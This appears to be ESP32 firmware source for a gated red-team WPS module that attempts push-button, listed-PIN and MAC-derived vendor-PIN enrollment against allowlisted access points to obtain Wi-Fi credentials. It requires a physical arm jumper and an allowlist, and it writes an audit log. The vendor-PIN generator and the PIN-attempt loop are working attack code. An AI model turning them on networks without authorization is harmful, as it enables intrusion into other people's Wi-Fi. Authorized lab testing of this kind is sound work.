#include "WpsRed.h"
#include "WpsBlue.h"
#include <WiFi.h>
#include <SD_MMC.h>
#include "esp_wifi.h"
#include "esp_wps.h"

// ===========================================================================
// Estado de arquivo
// ===========================================================================
static WpsRed::State s_state = WpsRed::IDLE;
static const char*   s_mode  = "";
static uint8_t       s_target[6];
static uint32_t      s_deadline_ms   = 0;   // fim da janela atual (PBC ou tentativa PIN)
static uint32_t      s_started_ms    = 0;
static int           s_pin_idx       = 0;
static int           s_pin_total     = 0;
static char          s_pins[WPS_PIN_MAX_ATTEMPTS][9];
static int           s_fail_count    = 0;   // p/ deteccao de NACK flood
static bool          s_wps_active    = false;
static WpsRed::StatusCb s_status     = nullptr;

// Allowlist
static uint8_t s_allow[WPS_ALLOW_MAX][6];
static int     s_allow_n = 0;

// Flags setadas pelo handler de eventos Wi-Fi (contexto do event loop)
static volatile bool s_ev_success = false;
static volatile bool s_ev_failed  = false;
static volatile bool s_ev_timeout = false;
static volatile bool s_ev_overlap = false;

// ===========================================================================
// Helpers
// ===========================================================================
static void macToStr(const uint8_t b[6], char* out) {
    snprintf(out, 18, "%02X:%02X:%02X:%02X:%02X:%02X", b[0],b[1],b[2],b[3],b[4],b[5]);
}
static bool macEq(const uint8_t* a, const uint8_t* b) { return memcmp(a,b,6)==0; }
static bool macZero(const uint8_t* a) {
    for (int i = 0; i < 6; i++) if (a[i]) return false;
    return true;
}

void WpsRed::setStatusCallback(StatusCb cb) { s_status = cb; }
void WpsRed::_emit(const char* msg, uint32_t color) {
    Serial.printf("[WpsRed] %s\n", msg);
    if (s_status) s_status(msg, color);
}

// ===========================================================================
// Handler de eventos Wi-Fi (WPS)
// ===========================================================================
static void wpsWiFiEvent(arduino_event_id_t event, arduino_event_info_t info) {
    (void)info;
    switch (event) {
        case ARDUINO_EVENT_WPS_ER_SUCCESS:     s_ev_success = true; break;
        case ARDUINO_EVENT_WPS_ER_FAILED:      s_ev_failed  = true; break;
        case ARDUINO_EVENT_WPS_ER_TIMEOUT:     s_ev_timeout = true; break;
        case ARDUINO_EVENT_WPS_ER_PBC_OVERLAP: s_ev_overlap = true; break;
        default: break;
    }
}

// ===========================================================================
// init
// ===========================================================================
void WpsRed::init() {
#if WPS_ARM_GPIO >= 0
    pinMode(WPS_ARM_GPIO, WPS_ARM_ACTIVE_HIGH ? INPUT_PULLDOWN : INPUT_PULLUP);
#endif
    s_state = IDLE;
    s_allow_n = 0;
    WiFi.onEvent(wpsWiFiEvent);
    Serial.println("[WpsRed] RED WPS inicializado (laboratorio; ARM+allowlist obrigatorios)");
}

// ===========================================================================
// Gates
// ===========================================================================
bool WpsRed::isArmed() {
#if WPS_ARM_GPIO >= 0
    int v = digitalRead(WPS_ARM_GPIO);
    return WPS_ARM_ACTIVE_HIGH ? (v == HIGH) : (v == LOW);
#else
    return false;   // fail-closed: sem GPIO de ARM configurado -> nunca armado
#endif
}

int WpsRed::loadAllowlist(const char* path) {
    s_allow_n = 0;
    File f = SD_MMC.open(path, FILE_READ);
    if (!f) { Serial.println("[WpsRed] allowlist ausente"); return 0; }
    while (f.available() && s_allow_n < WPS_ALLOW_MAX) {
        String line = f.readStringUntil('\n');
        line.trim();
        if (line.length() < 17 || line[0] == '#') continue;
        // aceita "XX:XX:.. # comentario"
        int hash = line.indexOf('#');
        String macpart = (hash >= 0) ? line.substring(0, hash) : line;
        macpart.trim();
        uint8_t b[6];
        if (sscanf(macpart.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                   &b[0],&b[1],&b[2],&b[3],&b[4],&b[5]) == 6) {
            memcpy(s_allow[s_allow_n++], b, 6);
        }
    }
    f.close();
    Serial.printf("[WpsRed] allowlist: %d BSSID(s)\n", s_allow_n);
    return s_allow_n;
}

int  WpsRed::allowlistCount() { return s_allow_n; }
bool WpsRed::isAllowlisted(const uint8_t bssid[6]) {
    for (int i = 0; i < s_allow_n; i++) if (macEq(s_allow[i], bssid)) return true;
    return false;
}

// ===========================================================================
// Auditoria — TODA tentativa e registrada
// ===========================================================================
bool WpsRed::audit(const char* mode, const uint8_t bssid[6],
                   const char* pin, const char* event, const char* result) {
    if (!SD_MMC.exists("/logs")) SD_MMC.mkdir("/logs");
    File f = SD_MMC.open("/logs/wps_audit.jsonl", FILE_APPEND);
    if (!f) { Serial.println("[WpsRed] AUDIT: falha ao abrir log"); return false; }
    char mac[18]; if (bssid) macToStr(bssid, mac); else strcpy(mac, "??");
    f.printf("{\"t\":%lu,\"mode\":\"%s\",\"target\":\"%s\",\"pin\":\"%s\",\"event\":\"%s\",\"result\":\"%s\"}\n",
             (unsigned long)millis(), mode ? mode : "", mac,
             pin ? pin : "", event ? event : "", result ? result : "");
    f.close();
    return true;
}

// ===========================================================================
// Gates comuns de inicio
// ===========================================================================
bool WpsRed::_startCommon(const uint8_t target[6], const char* mode) {
    if (s_state == RUNNING_PBC || s_state == RUNNING_PIN || s_state == VERIFY) {
        _emit("RECUSA: operacao RED ja em andamento", SENTINEL_RED_COLOR);
        return false;
    }
    // 1) ARM fisico
    if (!isArmed()) {
        audit(mode, target, "", "gate", "REFUSED_NOT_ARMED");
        _emit("RECUSA: ARM fisico ausente (jumper)", SENTINEL_RED_COLOR);
        s_state = REFUSED; return false;
    }
    // 2) allowlist nao-vazia
    if (s_allow_n == 0) loadAllowlist();
    if (s_allow_n == 0) {
        audit(mode, target, "", "gate", "REFUSED_EMPTY_ALLOWLIST");
        _emit("RECUSA: allowlist vazia", SENTINEL_RED_COLOR);
        s_state = REFUSED; return false;
    }
    // 3) alvo valido e allowlisted (sem coringa)
    if (!target || macZero(target)) {
        audit(mode, target, "", "gate", "REFUSED_NO_TARGET");
        _emit("RECUSA: alvo nao especificado (coringa proibido)", SENTINEL_RED_COLOR);
        s_state = REFUSED; return false;
    }
    if (!isAllowlisted(target)) {
        audit(mode, target, "", "gate", "REFUSED_NOT_ALLOWLISTED");
        _emit("RECUSA: alvo fora da allowlist", SENTINEL_RED_COLOR);
        s_state = REFUSED; return false;
    }
    // 4) termico
    if (_thermalTrip()) {
        audit(mode, target, "", "gate", "REFUSED_THERMAL");
        _emit("RECUSA: temperatura alta", SENTINEL_RED_COLOR);
        s_state = REFUSED; return false;
    }

    memcpy(s_target, target, 6);
    s_mode = mode;
    s_fail_count = 0;
    s_ev_success = false;
    s_ev_failed = false;
    s_ev_timeout = false;
    s_ev_overlap = false;
    s_started_ms = millis();

    // Sai do modo promiscuo p/ operar como STA (enrollee).
    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_STA);
    return true;
}

// ===========================================================================
// Inicio das operacoes
// ===========================================================================
bool WpsRed::redPbc(const uint8_t target[6]) {
    if (!_startCommon(target, "PBC")) return false;
    audit("PBC", s_target, "", "start", "OK");
    _beginPbc();
    return true;
}

bool WpsRed::redPin(const uint8_t target[6]) {
    if (!_startCommon(target, "PIN")) return false;
    // carrega ate 5 PINs
    s_pin_total = 0; s_pin_idx = 0;
    File f = SD_MMC.open("/allowlist/wps_pins.txt", FILE_READ);
    if (f) {
        while (f.available() && s_pin_total < WPS_PIN_MAX_ATTEMPTS) {
            String line = f.readStringUntil('\n');
            line.trim();
            if (line.length() < 4 || line[0] == '#') continue;
            int sp = line.indexOf(' '); if (sp > 0) line = line.substring(0, sp);
            line.trim();
            if (line.length() >= 4 && line.length() <= 8) {
                strncpy(s_pins[s_pin_total], line.c_str(), 8);
                s_pins[s_pin_total][8] = 0;
                s_pin_total++;
            }
        }
        f.close();
    }
    if (s_pin_total == 0) {
        audit("PIN", s_target, "", "start", "FAIL_NO_PINS");
        _emit("PIN: nenhum PIN em /sd/allowlist/wps_pins.txt", SENTINEL_RED_COLOR);
        _finish(DONE_FAIL, "NO_PINS");
        return false;
    }
    audit("PIN", s_target, "", "start", "OK");
    _emit("PIN enrollee: iniciando (max 5, para no fim)", SENTINEL_AMBER_COLOR);
    _beginPinAttempt();
    return true;
}

bool WpsRed::redVendorPinOneShot(const uint8_t target[6]) {
#if !WPS_ENABLE_VENDOR_PIN
    (void)target;
    _emit("Vendor-PIN desativado (WPS_ENABLE_VENDOR_PIN=0)", SENTINEL_AMBER_COLOR);
    return false;
#else
    if (!_startCommon(target, "VPIN")) return false;
    char pin[9]; computeVendorPin(s_target, pin);
    s_pin_total = 1; s_pin_idx = 0;
    strncpy(s_pins[0], pin, 8); s_pins[0][8] = 0;
    audit("VPIN", s_target, pin, "start", "OK");
    char m[64]; snprintf(m, sizeof(m), "Vendor-PIN 1-shot: %s", pin);
    _emit(m, SENTINEL_AMBER_COLOR);
    _beginPinAttempt();
    return true;
#endif
}

// ===========================================================================
// Passos internos do enrollee
// ===========================================================================
void WpsRed::_beginPbc() {
    esp_wps_config_t cfg = WPS_CONFIG_INIT_DEFAULT(WPS_TYPE_PBC);
    if (esp_wifi_wps_enable(&cfg) != ESP_OK || esp_wifi_wps_start(0) != ESP_OK) {
        audit("PBC", s_target, "", "enable", "FAIL");
        _finish(DONE_FAIL, "WPS_ENABLE_FAIL");
        return;
    }
    s_wps_active = true;
    s_state = RUNNING_PBC;
    s_deadline_ms = millis() + WPS_PBC_TIMEOUT_MS;
    _emit("PBC ativo (120 s)", SENTINEL_BLUE_COLOR);
}

void WpsRed::_beginPinAttempt() {
    esp_wps_config_t cfg = WPS_CONFIG_INIT_DEFAULT(WPS_TYPE_PIN);
    strncpy(cfg.pin, s_pins[s_pin_idx], sizeof(cfg.pin) - 1);
    cfg.pin[sizeof(cfg.pin) - 1] = 0;
    s_ev_success = false;
    s_ev_failed = false;
    s_ev_timeout = false;
    if (esp_wifi_wps_enable(&cfg) != ESP_OK || esp_wifi_wps_start(0) != ESP_OK) {
        audit(s_mode, s_target, s_pins[s_pin_idx], "enable", "FAIL");
        _finish(DONE_FAIL, "WPS_ENABLE_FAIL");
        return;
    }
    s_wps_active = true;
    s_state = RUNNING_PIN;
    s_deadline_ms = millis() + WPS_PIN_ATTEMPT_TIMEOUT_MS;
    char m[48];
    snprintf(m, sizeof(m), "PIN %d/%d: %s", s_pin_idx + 1, s_pin_total, s_pins[s_pin_idx]);
    audit(s_mode, s_target, s_pins[s_pin_idx], "attempt", "START");
    _emit(m, SENTINEL_AMBER_COLOR);
}

void WpsRed::_stopWps() {
    if (s_wps_active) { esp_wifi_wps_disable(); s_wps_active = false; }
    WiFi.disconnect(true, false);
}

// ===========================================================================
// Condicoes de parada
// ===========================================================================
bool WpsRed::_thermalTrip() {
    float t = temperatureRead();   // SoC (arduino-esp32)
    return (t > WPS_THERMAL_MAX_C);
}

bool WpsRed::_targetLocked() {
    const WpsApEntry* e = WpsBlue::findByBssid(s_target);
    return (e && e->wps.present && e->wps.ap_setup_locked);
}

void WpsRed::_finish(State st, const char* result) {
    _stopWps();
    s_state = st;
    audit(s_mode, s_target, "", "finish", result);
    uint32_t c = (st == DONE_OK) ? SENTINEL_GREEN_COLOR : SENTINEL_RED_COLOR;
    char m[64]; snprintf(m, sizeof(m), "RED finalizado: %s", result);
    _emit(m, c);
}

void WpsRed::abort(const char* reason) {
    if (s_state != RUNNING_PBC && s_state != RUNNING_PIN && s_state != VERIFY) return;
    _finish(ABORTED, reason ? reason : "ABORT");
}

// ===========================================================================
// tick — chamada ~1x/s
// ===========================================================================
void WpsRed::tick() {
    if (s_state != RUNNING_PBC && s_state != RUNNING_PIN && s_state != VERIFY) return;

    // Paradas imediatas -------------------------------------------------------
    if (_thermalTrip())      { audit(s_mode, s_target, "", "stop", "THERMAL"); _finish(ABORTED, "THERMAL"); return; }
    if (s_ev_overlap)        { audit(s_mode, s_target, "", "stop", "PBC_OVERLAP"); _finish(ABORTED, "PBC_OVERLAP"); return; }
    if (_targetLocked())     { audit(s_mode, s_target, "", "stop", "WPS_LOCKED"); _finish(ABORTED, "WPS_LOCKED"); return; }
    if (s_fail_count >= WPS_NACK_FLOOD_LIMIT) {
        audit(s_mode, s_target, "", "stop", "NACK_FLOOD"); _finish(ABORTED, "NACK_FLOOD"); return;
    }

    // Sucesso -> verificacao de alvo (soft targeting) -------------------------
    if (s_ev_success) {
        s_ev_success = false;
        s_state = VERIFY;
        // A partir das credenciais WPS o stack conecta; le o BSSID associado.
        uint8_t cur[6]; memset(cur, 0, 6);
        wifi_ap_record_t ap;
        if (esp_wifi_sta_get_ap_info(&ap) == ESP_OK) memcpy(cur, ap.bssid, 6);

        if (!macZero(cur) && !macEq(cur, s_target)) {
            // Associou a um AP que NAO e o alvo -> violacao de escopo.
            char mac[18]; macToStr(cur, mac);
            char m[80]; snprintf(m, sizeof(m), "VIOLATION: associou a %s != alvo", mac);
            audit(s_mode, cur, "", "verify", "VIOLATION_NOT_TARGET");
            _emit(m, SENTINEL_RED_COLOR);
            _finish(ABORTED, "VIOLATION_NOT_TARGET");
            return;
        }
        // Alvo confirmado (ou BSSID indisponivel: aceita com ressalva auditada).
        audit(s_mode, s_target, "", "verify",
              macZero(cur) ? "OK_BSSID_UNKNOWN" : "OK_TARGET");
        _finish(DONE_OK, "SUCCESS");
        return;
    }

    // Falha / timeout ---------------------------------------------------------
    bool failed  = s_ev_failed;
    bool timeout = s_ev_timeout || (millis() > s_deadline_ms);

    if (s_state == RUNNING_PBC) {
        if (failed)  { s_fail_count++; s_ev_failed = false;
                       audit("PBC", s_target, "", "event", "FAILED"); }
        if (timeout) { audit("PBC", s_target, "", "stop", "TIMEOUT"); _finish(DONE_FAIL, "PBC_TIMEOUT"); }
        return;
    }

    if (s_state == RUNNING_PIN) {
        if (failed || timeout) {
            const char* why = failed ? "FAILED" : "TIMEOUT";
            if (failed) s_fail_count++;
            s_ev_failed = false;
            s_ev_timeout = false;
            audit(s_mode, s_target, s_pins[s_pin_idx], "attempt", why);
            _stopWps();                    // encerra esta tentativa
            s_pin_idx++;
            if (s_pin_idx >= s_pin_total || s_pin_idx >= WPS_PIN_MAX_ATTEMPTS) {
                _emit("PIN: limite de tentativas atingido — parando", SENTINEL_AMBER_COLOR);
                _finish(DONE_FAIL, "PIN_EXHAUSTED");
            } else {
                delay(300);
                _beginPinAttempt();        // proxima (ainda <=5)
            }
        }
        return;
    }
}

// ===========================================================================
// Getters
// ===========================================================================
WpsRed::State WpsRed::state() { return s_state; }
const char* WpsRed::stateStr() {
    switch (s_state) {
        case IDLE: return "IDLE"; case RUNNING_PBC: return "PBC";
        case RUNNING_PIN: return "PIN"; case VERIFY: return "VERIFY";
        case DONE_OK: return "DONE_OK"; case DONE_FAIL: return "DONE_FAIL";
        case ABORTED: return "ABORTED"; case REFUSED: return "REFUSED";
    }
    return "?";
}
int WpsRed::secondsRemaining() {
    if (s_state != RUNNING_PBC && s_state != RUNNING_PIN) return 0;
    uint32_t now = millis();
    if (now >= s_deadline_ms) return 0;
    return (int)((s_deadline_ms - now) / 1000);
}
int WpsRed::pinAttempt() { return s_pin_idx + 1; }

// ===========================================================================
// Gerador de PIN vendor (1 candidato). Checksum WPS padrao.
// ===========================================================================
static uint8_t wpsChecksum(uint32_t pin7) {
    uint32_t p = pin7, accum = 0;
    accum += 3 * (p % 10); p /= 10;
    accum += 1 * (p % 10); p /= 10;
    accum += 3 * (p % 10); p /= 10;
    accum += 1 * (p % 10); p /= 10;
    accum += 3 * (p % 10); p /= 10;
    accum += 1 * (p % 10); p /= 10;
    accum += 3 * (p % 10);
    return (uint8_t)((10 - (accum % 10)) % 10);
}
void WpsRed::computeVendorPin(const uint8_t bssid[6], char out[9]) {
    uint32_t serial = ((uint32_t)bssid[3] << 16) | ((uint32_t)bssid[4] << 8) | bssid[5];
    uint32_t pin7 = serial % 10000000UL;
    uint32_t pin8 = pin7 * 10UL + wpsChecksum(pin7);
    char tmp[16];
    snprintf(tmp, sizeof(tmp), "%08lu", (unsigned long)pin8);
    strncpy(out, tmp, 8); out[8] = 0;
}
